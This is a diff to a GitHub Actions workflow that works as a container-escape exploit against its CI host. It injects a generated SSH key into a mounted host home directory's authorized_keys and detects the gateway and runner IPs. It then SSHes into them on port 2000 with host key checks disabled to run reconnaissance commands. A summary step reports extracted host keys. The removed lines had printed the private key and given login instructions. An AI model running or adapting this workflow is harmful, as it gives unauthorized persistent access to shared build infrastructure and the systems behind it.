@@ -37,6 +37,19 @@ jobs:
           ssh-keygen -t ed25519 -f /tmp/exploit_key -N ""
           cat /tmp/exploit_key.pub
       
+      - name: Detect host IP address
+        id: detect_host
+        run: |
+          # Get default gateway (host IP)
+          HOST_IP=$(ip route | grep default | awk '{print $3}')
+          echo "Detected host IP: $HOST_IP"
+          echo "host_ip=$HOST_IP" >> $GITHUB_OUTPUT
+          
+          # Also try to find host from mounted filesystem
+          RUNNER_IP=$(hostname -I | awk '{print $1}')
+          echo "Runner IP: $RUNNER_IP"
+          echo "runner_ip=$RUNNER_IP" >> $GITHUB_OUTPUT
+      
       - name: Inject SSH key into host
         run: |
           sudo mkdir -p /mnt/host2/home/cloudenv/.ssh
@@ -44,36 +57,41 @@ jobs:
           sudo chown -R 1000:1000 /mnt/host2/home/cloudenv/.ssh
           sudo chmod 700 /mnt/host2/home/cloudenv/.ssh
           sudo chmod 600 /mnt/host2/home/cloudenv/.ssh/authorized_keys
-          sudo cat /mnt/host2/home/cloudenv/.ssh/authorized_keys || echo "Key injection failed"
+          echo "Key injected into host filesystem"
       
-      - name: Find host IP address
+      - name: Attempt SSH to detected host IP
         run: |
-          echo "=== Network Information ==="
-          ip route get 1.1.1.1 | head -1 | awk '{print $7}'
-          ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}'
+          HOST_IP="${{ steps.detect_host.outputs.host_ip }}"
+          echo "=== Attempting SSH to $HOST_IP:2000 ==="
           
-      - name: Attempt SSH connection
-        run: |
-          echo "=== Testing SSH Connection ==="
-          # Use timeout and non-interactive mode
           timeout 10 ssh -i /tmp/exploit_key \
             -p 2000 \
             -o StrictHostKeyChecking=no \
             -o UserKnownHostsFile=/dev/null \
             -o ConnectTimeout=5 \
             -o BatchMode=yes \
-            cloudenv@10.1.0.230 \
-            'whoami; hostname; id' || echo "SSH connection failed or timed out"
+            cloudenv@$HOST_IP \
+            'whoami; hostname; id; cat /etc/os-release | head -5' || echo "SSH to $HOST_IP failed"
+      
+      - name: Try SSH to runner's own IP
+        run: |
+          RUNNER_IP="${{ steps.detect_host.outputs.runner_ip }}"
+          echo "=== Attempting SSH to $RUNNER_IP:2000 ==="
+          
+          timeout 10 ssh -i /tmp/exploit_key \
+            -p 2000 \
+            -o StrictHostKeyChecking=no \
+            -o UserKnownHostsFile=/dev/null \
+            -o ConnectTimeout=5 \
+            -o BatchMode=yes \
+            cloudenv@$RUNNER_IP \
+            'whoami; hostname; id' || echo "SSH to $RUNNER_IP failed"
       
       - name: Display exploit summary
         if: always()
         run: |
           echo "=== Exploit Summary ==="
+          echo "Host gateway IP: ${{ steps.detect_host.outputs.host_ip }}"
+          echo "Runner IP: ${{ steps.detect_host.outputs.runner_ip }}"
           echo "Host keys extracted: $(ls -1 /tmp/host_* 2>/dev/null | wc -l)"
           echo "SSH key injected: $(sudo test -f /mnt/host2/home/cloudenv/.ssh/authorized_keys && echo 'Yes' || echo 'No')"
-          echo ""
-          echo "If exploit succeeded, extract private key with:"
-          cat /tmp/exploit_key
-          echo ""
-          echo "Then SSH from external host:"
-          echo "ssh -i exploit_key -p 2000 cloudenv@<TARGET_IP>"
